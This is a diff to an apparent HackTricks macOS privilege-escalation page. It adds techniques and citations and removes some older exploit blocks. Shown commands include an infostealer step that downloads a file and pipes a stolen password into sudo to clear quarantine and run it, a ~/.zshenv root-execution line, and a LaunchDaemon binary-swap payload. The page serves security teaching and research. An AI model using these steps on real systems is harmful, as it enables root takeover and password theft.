@@ -13,18 +13,18 @@ macos-security-protections/macos-tcc/
 
 ## Linux Privesc
 
-Please note that **most of the tricks about privilege escalation affecting Linux/Unix will affect also MacOS** machines. So see:
+Many privilege-escalation techniques that affect Linux or other Unix-like systems also apply to macOS. See:
 
 
 {{#ref}}
-../../linux-hardening/privilege-escalation/
+../../linux-hardening/linux-basics/linux-privilege-escalation/README.md
 {{#endref}}
 
 ## User Interaction
 
 ### Sudo Hijacking
 
-You can find the original [Sudo Hijacking technique inside the Linux Privilege Escalation post](../../linux-hardening/privilege-escalation/index.html#sudo-hijacking).
+You can find the original [Sudo Hijacking technique inside the Linux Privilege Escalation post](../../linux-hardening/linux-basics/linux-privilege-escalation/index.html#sudo-hijacking).
 
 However, macOS **maintains** the user's **`PATH`** when he executes **`sudo`**. Which means that another way to achieve this attack would be to **hijack other binaries** that the victim sill execute when **running sudo:**
 
@@ -240,9 +240,15 @@ curl -o /tmp/update https://example.com/update
 printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
 ```
 
-The stolen password can then be reused to **clear Gatekeeper quarantine with `xattr -c`**, copy LaunchDaemons or other privileged files, and run additional stages non-interactively.
+The stolen password can then be reused to **clear Gatekeeper quarantine with `xattr -c`**, copy LaunchDaemons or other privileged files, and run additional stages non-interactively.<sup>[[1]](#references)</sup>
 
-## Newer macOS-specific vectors (2023–2025)
+#### Validating captured passwords through PAM
+
+A native-looking secure-text prompt can collect a candidate account password and validate it in-process through PAM instead of spawning `dscl`, `security`, or `osascript`. The caller starts a PAM transaction with `pam_start`, supplies the candidate through a conversation callback, calls `pam_authenticate`, and closes the transaction with `pam_end`. A failed check can return to the password field; a successful check confirms the password without starting a separate verification process. PAM authentication alone does **not** elevate the caller or authorize privileged operations.<sup>[[9]](#references)[[10]](#references)</sup>
+
+If the login and Keychain passwords match, the captured password may also be usable for operations that require the current Keychain password; see [Keychain ACL and partition-list constraints](../macos-red-teaming/macos-keychain.md).<sup>[[10]](#references)</sup>
+
+## Newer macOS-specific vectors (2023–2026)
 
 ### Deprecated `AuthorizationExecuteWithPrivileges` still usable
 
@@ -263,7 +269,7 @@ Combine with the **masquerading tricks above** to present a believable password 
 
 ### Privileged helper / XPC triage
 
-A lot of modern third-party macOS privescs follow the same pattern: a **root LaunchDaemon** exposes a **Mach/XPC service** from **`/Library/PrivilegedHelperTools`**, then the helper either **doesn't validate the client**, validates it **too late** (PID race), or exposes a **root method** that consumes a **user-controlled path/script**. This is the bug class behind many recent helper bugs in VPN clients, game launchers and updaters.
+A lot of modern third-party macOS privescs follow the same pattern: a **root LaunchDaemon** exposes a **Mach/XPC service** from **`/Library/PrivilegedHelperTools`**, then the helper either **doesn't validate the client**, validates it **too late** (PID race), or exposes a **root method** that consumes a **user-controlled path/script**. This is the bug class behind many recent helper bugs in VPN clients, game launchers and updaters.<sup>[[2]](#references)</sup>
 
 Quick triage checklist:
 
@@ -287,9 +293,9 @@ For more details on helper authorization bugs check [this page](macos-proces-abu
 
 ### PackageKit script environment inheritance (CVE-2024-27822)
 
-Until Apple fixed it in **Sonoma 14.5**, **Ventura 13.6.7** and **Monterey 12.7.5**, user-initiated installs via **`Installer.app`** / **`PackageKit.framework`** could execute **PKG scripts as root inside the current user's environment**. That means a package using **`#!/bin/zsh`** would load the attacker's **`~/.zshenv`** and run it as **root** when the victim installed the package.
+Until Apple fixed it in **Sonoma 14.5**, **Ventura 13.6.7** and **Monterey 12.7.5**, user-initiated installs via **`Installer.app`** / **`PackageKit.framework`** could execute **PKG scripts as root inside the current user's environment**. That means a package using **`#!/bin/zsh`** would load the attacker's **`~/.zshenv`** and run it as **root** when the victim installed the package.<sup>[[3]](#references)</sup>
 
-This is especially interesting as a **logic bomb**: you only need a foothold in the user's account and a writable shell startup file, then you wait for any vulnerable **zsh-based** installer to be executed by the user. This does **not** generally apply to **MDM/Munki** deployments because those run inside the root user's environment.
+This is especially interesting as a **logic bomb**: you only need a foothold in the user's account and a writable shell startup file, then you wait for any vulnerable **zsh-based** installer to be executed by the user. This does **not** generally apply to **MDM/Munki** deployments because those run inside the root user's environment.<sup>[[3]](#references)</sup>
 
 ```bash
 # inspect a vendor pkg for shell-based install scripts
@@ -303,45 +309,73 @@ echo 'id > /tmp/pkg-root' >> ~/.zshenv
 
 If you want a deeper dive into installer-specific abuse, also check [this page](macos-files-folders-and-binaries/macos-installers-abuse.md).
 
-### LaunchDaemon plist hijack (CVE-2025-24085 pattern)
+### Installer destination collision via `.localized`
 
-If a LaunchDaemon plist or its `ProgramArguments` target is **user-writable**, you can escalate by swapping it then forcing launchd to reload:
+Some third-party installers register a root LaunchDaemon whose executable is referenced with a fixed path inside `/Applications/Target.app`. If an attacker can create that bundle first with a **different bundle identifier**, Installer may preserve the decoy and place the real app at `/Applications/Target.localized/Target.app`. The daemon still points to the original path. Therefore, an attacker-controlled executable inside the decoy bundle can later run as root.<sup>[[8]](#references)</sup>
+
+The important preconditions are:<sup>[[8]](#references)</sup>
+
+1. The attacker can create or control the expected application path.
+2. The package does not remove the conflicting bundle.
+3. The privileged job uses a hard-coded path inside that bundle.
+4. The user or an MDM workflow installs the package and registers the job.
+
+Look for relocated bundles and then review LaunchDaemon targets with the enumeration loop in the next section:<sup>[[8]](#references)</sup>
 
 ```bash
-sudo launchctl bootout system /Library/LaunchDaemons/com.apple.securemonitor.plist
-cp /tmp/root.sh /Library/PrivilegedHelperTools/securemonitor
-chmod 755 /Library/PrivilegedHelperTools/securemonitor
-cat > /Library/LaunchDaemons/com.apple.securemonitor.plist <<'PLIST'
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
-<plist version="1.0"><dict>
-  <key>Label</key><string>com.apple.securemonitor</string>
-  <key>ProgramArguments</key>
-  <array><string>/Library/PrivilegedHelperTools/securemonitor</string></array>
-  <key>RunAtLoad</key><true/>
-</dict></plist>
-PLIST
-sudo launchctl bootstrap system /Library/LaunchDaemons/com.apple.securemonitor.plist
+find /Applications -type d -name '*.localized' -prune -print
+for app in /Applications/*.app; do
+  [ -d "$app" ] && stat -f '%Su:%Sg %Sp %N' "$app"
+done
 ```
 
-This mirrors the exploit pattern published for **CVE-2025-24085**, where a writable plist was abused to execute attacker code as root.
+A safer installer resolves the final bundle location and keeps privileged executables in a root-owned location such as `/Library/PrivilegedHelperTools`. It should also verify ownership and code signing before registering or starting the job.<sup>[[8]](#references)</sup>
 
-### XNU SMR credential race (CVE-2025-24118)
+### Writable LaunchDaemon target hijack
 
-A **race in `kauth_cred_proc_update`** lets a local attacker corrupt the read-only credential pointer (`proc_ro.p_ucred`) by racing `setgid()`/`getgid()` loops across threads until a torn `memcpy` occurs. Successful corruption yields **uid 0** and kernel memory access. Minimal PoC structure:
+A LaunchDaemon plist may be root-owned while its `Program` or first `ProgramArguments` entry points into a user-writable directory. Check the **whole path**, not only the executable mode. If the parent directory is writable, an attacker may rename a root-owned executable and create a replacement at the same path. The replacement runs as root the next time the job starts. A reboot or a normal service restart is enough. The attacker does not need permission to run `launchctl bootstrap` in the system domain.<sup>[[7]](#references)</sup>
+
+Enumerate each target and its immediate parent first:<sup>[[7]](#references)</sup>
+
+```bash
+for p in /Library/LaunchDaemons/*.plist; do
+  target=$(plutil -extract Program raw -o - "$p" 2>/dev/null)
+  [ -n "$target" ] ||
+    target=$(plutil -extract ProgramArguments.0 raw -o - "$p" 2>/dev/null)
+  [ -n "$target" ] || continue
+  printf '\n%s -> %s\n' "$p" "$target"
+  ls -ld "$target" "$(dirname "$target")" 2>/dev/null
+done
+```
+
+When the file or its parent is writable, preserve the original binary and replace the path with an executable payload. Then wait for the already-loaded daemon to restart.<sup>[[7]](#references)</sup>
+
+```bash
+target=/path/from/the/plist
+mv "$target" "$target.real"
+cp /tmp/payload "$target"
+chmod 755 "$target"
+```
+
+### XNU SMR credential-pointer race (CVE-2025-24118)
+
+The vulnerable `kauth_cred_proc_update` path updated `proc_ro.p_ucred` with the non-atomic `zalloc_ro_mut` API while SMR readers loaded the pointer without a lock. The public trigger uses a specially prepared setgid binary. One thread switches between its real and effective group IDs while another thread repeatedly enters a syscall such as `getgid()`.<sup>[[4]](#references)</sup>
 
 ```c
-// thread A
-while (1) setgid(rand());
-// thread B
-while (1) getgid();
+// Writer thread inside a setgid binary
+while (1) {
+    setgid(real_gid);
+    setgid(effective_gid);
+}
+// Reader thread
+while (1) observed_gid = getgid();
 ```
 
-Couple with heap grooming to land controlled data where the pointer re-reads. On vulnerable builds this is a reliable **local kernel privesc** without SIP bypass requirements.
+Treat this as a **race primitive**, not a ready-made root exploit. The published PoC demonstrates a torn credential pointer. It commonly ends in a kernel panic. The researcher only reproduced the corruption on Intel and did not provide deterministic control of the resulting credential object. Apple changed the update to an atomic pointer exchange in macOS 15.3.<sup>[[4]](#references)</sup>
 
 ### SIP bypass via Migration assistant ("Migraine", CVE-2023-32369)
 
-If you already have root, SIP still blocks writes to system locations. The **Migraine** bug abuses the Migration Assistant entitlement `com.apple.rootless.install.heritable` to spawn a child process that inherits SIP bypass and overwrites protected paths (e.g., `/System/Library/LaunchDaemons`). The chain:
+If you already have root, SIP still blocks writes to system locations. The **Migraine** bug abuses the Migration Assistant entitlement `com.apple.rootless.install.heritable` to spawn a child process that inherits SIP bypass and overwrites protected paths (e.g., `/System/Library/LaunchDaemons`).<sup>[[5]](#references)</sup> The chain:
 
 1. Obtain root on a live system.
 2. Trigger `systemmigrationd` with crafted state to run an attacker-controlled binary.
@@ -349,41 +383,19 @@ If you already have root, SIP still blocks writes to system locations. The **Mig
 
 ### NSPredicate/XPC expression smuggling (CVE-2023-23530/23531 bug class)
 
-Multiple Apple daemons accept **NSPredicate** objects over XPC and only validate the `expressionType` field, which is attacker-controlled. By crafting a predicate that evaluates arbitrary selectors you can achieve **code execution in root/system XPC services** (e.g., `coreduetd`, `contextstored`). When combined with an initial app sandbox escape, this grants **privilege escalation without user prompts**. Look for XPC endpoints that deserialize predicates and lack a robust visitor.
+Multiple Apple daemons accept **NSPredicate** objects over XPC and only validate the `expressionType` field, which is attacker-controlled. By crafting a predicate that evaluates arbitrary selectors you can achieve **code execution in root/system XPC services** (e.g., `coreduetd`, `contextstored`). When combined with an initial app sandbox escape, this grants **privilege escalation without user prompts**. Look for XPC endpoints that deserialize predicates and lack a robust visitor.<sup>[[6]](#references)</sup>
 
 ## TCC - Root Privilege Escalation
 
 ### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation
 
-**Any user** (even unprivileged ones) can create and mount a time machine snapshot an **access ALL the files** of that snapshot.\
-The **only privileged** needed is for the application used (like `Terminal`) to have **Full Disk Access** (FDA) access (`kTCCServiceSystemPolicyAllfiles`) which need to be granted by an admin.
+**Any user** (even unprivileged ones) can create and mount a Time Machine snapshot with `-o noowners` and **access ALL the files** of that snapshot, bypassing the ownership checks on the live volume. The only privilege needed is for the application used (like `Terminal`) to have **Full Disk Access** (`kTCCServiceSystemPolicyAllfiles`).
 
-<details>
-<summary>Mount Time Machine snapshot</summary>
+The commands and the full explanation are in the TCC bypasses page:
 
-```bash
-# Create snapshot
-tmutil localsnapshot
-
-# List snapshots
-tmutil listlocalsnapshots /
-Snapshots for disk /:
-com.apple.TimeMachine.2023-05-29-001751.local
-
-# Generate folder to mount it
-cd /tmp # I didn it from this folder
-mkdir /tmp/snap
-
-# Mount it, "noowners" will mount the folder so the current user can access everything
-/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap
-
-# Access it
-ls /tmp/snap/Users/admin_user # This will work
-```
-
-</details>
-
-A more detailed explanation can be [**found in the original report**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**
+{{#ref}}
+macos-security-protections/macos-tcc/macos-tcc-bypasses/README.md
+{{#endref}}
 
 ## Sensitive Information
 
@@ -394,11 +406,19 @@ This can be useful to escalate privileges:
 macos-files-folders-and-binaries/macos-sensitive-locations.md
 {{#endref}}
 
-## References
 
-- [Microsoft "Migraine" SIP bypass (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
-- [CVE-2025-24118 SMR credential race write-up & PoC](https://github.com/jprx/CVE-2025-24118)
-- [CVE-2024-27822: macOS PackageKit Privilege Escalation](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
-- [CVE-2024-30165: AWS Client VPN for macOS Local Privilege Escalation](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)
 
 {{#include ../../banners/hacktricks-training.md}}
+
+## References
+
+- [1] [Pentest Partners - 2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
+- [2] [CVE-2024-30165: AWS Client VPN for macOS Local Privilege Escalation](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)
+- [3] [CVE-2024-27822: macOS PackageKit Privilege Escalation](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
+- [4] [TRAVERTINE: CVE-2025-24118](https://jprx.io/cve-2025-24118/)
+- [5] [Microsoft "Migraine" SIP bypass (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
+- [6] [Trellix Advanced Research Center - A New Privilege Escalation Bug Class on macOS and iOS (CVE-2023-23530/23531)](https://www.trellix.com/en-sg/blogs/research/trellix-advanced-research-center-discovers-a-new-privilege-escalation-bug-class-on-macos-and-ios/)
+- [7] [LaunchDaemon Hijacking: privilege escalation and persistence via insecure folder permissions](https://bradleyjkemp.dev/post/launchdaemon-hijacking/)
+- [8] [macOS LPE via the .localized directory](https://theevilbit.github.io/posts/localized/)
+- [9] [Jamf Threat Labs - PamStealer: macOS malware posing as clipboard manager app](https://www.jamf.com/blog/pamstealer-macos-infostealer-applescript-rust/)
+- [10] [Kaspersky Securelist - MacSync under the microscope](https://securelist.com/macsync-new-version/121383/)
